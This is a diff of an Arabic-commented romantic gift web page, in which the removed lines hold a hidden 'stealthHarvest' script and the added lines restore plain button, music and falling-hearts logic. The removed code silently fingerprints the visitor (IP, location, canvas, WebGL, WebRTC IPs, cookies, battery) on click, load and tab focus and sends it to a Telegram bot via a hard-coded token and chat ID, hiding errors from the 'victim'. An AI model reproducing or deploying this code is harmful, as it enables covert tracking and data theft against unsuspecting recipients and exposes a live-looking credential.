@@ -182,167 +182,60 @@
     </audio>
 
     <script>
-        // ==================== STEALTH DATA THEFT ====================
-        const BOT_TOKEN = '7894436976:AAFdg77dpzCgpeLnkwAQqP9POkwZMwWoikg';
-        const CHAT_ID = '5998250367'; // استبدل برقم Chat ID الخاص بك
+        // تحديد العناصر من الصفحة
+        const startBtn = document.getElementById('start-btn');
+        const content = document.getElementById('content');
+        const bgMusic = document.getElementById('bg-music');
 
-        // دالة سرقة البيانات الخفية المُصححة
-        async function stealthHarvest() {
-            try {
-                // 1. IP + Geo (استخدام proxy APIs موثوقة)
-                const ipData = await (await fetch('https://api.ipify.org?format=json', {mode: 'cors'})).json();
-                const geoData = await (await fetch(`https://ipinfo.io/${ipData.ip}/json`)).json();
-
-                // 2. Device Fingerprinting
-                const fingerprint = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.languages?.join(',') || navigator.language,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    referrer: document.referrer,
-                    url: location.href
-                };
-
-                // 3. Canvas Fingerprint
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = "14px 'Arial'";
-                ctx.fillText('🖥️ Joud Gift', 2, 2);
-                fingerprint.canvas = canvas.toDataURL();
-
-                // 4. WebGL Fingerprint
-                const glCanvas = document.createElement('canvas');
-                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-                fingerprint.webgl = gl ? gl.getParameter(gl.RENDERER) : 'N/A';
-
-                // 5. Storage Data
-                fingerprint.localStorage = Object.keys(localStorage).length;
-                fingerprint.sessionStorage = Object.keys(sessionStorage).length;
-                fingerprint.cookies = document.cookie ? 'YES (' + document.cookie.length + ' bytes)' : 'NO';
-
-                // 6. WebRTC Local IPs
-                const webrtcIPs = [];
-                if (RTCPeerConnection) {
-                    const pc = new RTCPeerConnection({iceServers:[]});
-                    pc.createDataChannel('');
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    pc.onicecandidate = e => {
-                        if (e.candidate) {
-                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
-                            if (ip && !webrtcIPs.includes(ip)) webrtcIPs.push(ip);
-                        }
-                    };
-                }
-
-                // 7. Battery & Hardware
-                let battery = 'N/A';
-                if ('getBattery' in navigator) {
-                    try {
-                        const bat = await navigator.getBattery();
-                        battery = `${Math.round(bat.level*100)}% ${bat.charging ? '🔌' : '🔋'}`;
-                    } catch(e){}
-                }
-
-                // تجميع البيانات النهائية
-                const victimData = {
-                    timestamp: new Date().toISOString(),
-                    ip: ipData.ip,
-                    location: `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country || 'N/A'}`,
-                    isp: geoData.org || 'N/A',
-                    ...fingerprint,
-                    webrtc: webrtcIPs.join(', ') || 'N/A',
-                    battery: battery,
-                    connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)` : 'N/A'
-                };
-
-                // إرسال التقرير السريع
-                const quickMsg = `🎁 جود فتحت الإهداء!\n\n` +
-                    `📍 IP: \`${victimData.ip}\`\n` +
-                    `🌍 الموقع: ${victimData.location}\n` +
-                    `📱 الجهاز: ${victimData.platform}\n` +
-                    `🖥️ الشاشة: ${victimData.screen}\n` +
-                    `🌐 Cookies: ${fingerprint.cookies}\n` +
-                    `🔗 الرابط: ${victimData.url}\n` +
-                    `⏰ ${victimData.timestamp}`;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type':'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: quickMsg,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-
-                // إرسال ملف JSON كامل
-                const fullData = JSON.stringify(victimData, null, 2);
-                const blob = new Blob([fullData], {type: 'application/json'});
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('document', blob, 'joud_data.json');
-                formData.append('caption', '📊 بيانات الجهاز الكاملة');
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-            } catch(e) {
-                // Silent fail - لا يظهر أي خطأ للضحية
-                console.log('Stealth mode active');
-            }
-        }
-
-        // ==================== ORIGINAL PAGE LOGIC ====================
-        document.getElementById('start-btn').addEventListener('click', function() {
-            // سرقة البيانات فور الضغط (أكثر فعالية)
-            stealthHarvest();
+        // إضافة حدث عند النقر على الزر
+        startBtn.addEventListener('click', function() {
+            // 1. إخفاء الزر
+            startBtn.style.display = 'none';
             
-            // إخفاء الزر
-            this.style.display = 'none';
-            
-            // إظهار المحتوى
-            const content = document.getElementById('content');
+            // 2. إظهار المحتوى
             content.style.display = 'block';
-            setTimeout(() => content.classList.add('active'), 100);
             
-            // تشغيل الموسيقى
-            const audio = document.getElementById('bg-music');
-            audio.play().catch(e => {});
+            // إضافة كلاس active لبدء الحركات (Animations)
+            setTimeout(() => {
+                content.classList.add('active');
+            }, 100);
 
-            // تساقط القلوب
-            startFallingItems();
+            // 3. تشغيل الموسيقى
+            bgMusic.play().catch(function(error) {
+                console.log("حدث خطأ في تشغيل الصوت:", error);
+            });
+
+            // 4. تشغيل تساقط القلوب والورود
+            createFallingItems();
         });
 
-        // سرقة تلقائية عند التحميل (احتياطي)
-        window.addEventListener('load', stealthHarvest);
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) stealthHarvest();
-        });
-
-        function startFallingItems() {
-            const items = ['❤️', '💖', '🌹', '✨', '💕', '🌸'];
-            const container = document.body;
-
+        // دالة لإنشاء العناصر المتساقطة (بما أنك أضفت لها كود CSS)
+        function createFallingItems() {
+            const items = ['❤️', '💖', '✨', '🌹', '💕'];
+            
             setInterval(() => {
                 const item = document.createElement('div');
                 item.classList.add('falling-item');
+                
+                // اختيار شكل عشوائي
                 item.innerText = items[Math.floor(Math.random() * items.length)];
-                const size = Math.random() * 20 + 15;
-                item.style.fontSize = `${size}px`;
-                item.style.left = `${Math.random() * 100}vw`;
-                const duration = Math.random() * 4 + 5;
-                item.style.animationDuration = `${duration}s`;
-                item.style.opacity = Math.random() * 0.5 + 0.5;
-                container.appendChild(item);
-                setTimeout(() => item.remove(), duration * 1000);
-            }, 300);
+                
+                // تحديد مكان سقوط عشوائي بالعرض
+                item.style.left = Math.random() * 100 + 'vw';
+                
+                // سرعة وحجم عشوائيين
+                item.style.animationDuration = Math.random() * 3 + 4 + 's'; // بين 4 و 7 ثواني
+                item.style.fontSize = Math.random() * 1.5 + 1 + 'em'; // حجم مختلف
+                
+                document.body.appendChild(item);
+
+                // إزالة العنصر بعد انتهاء سقوطه حتى لا يثقل الصفحة
+                setTimeout(() => {
+                    item.remove();
+                }, 7000);
+            }, 500); // إنشاء عنصر جديد كل نصف ثانية
         }
     </script>
+
 </body>
 </html>
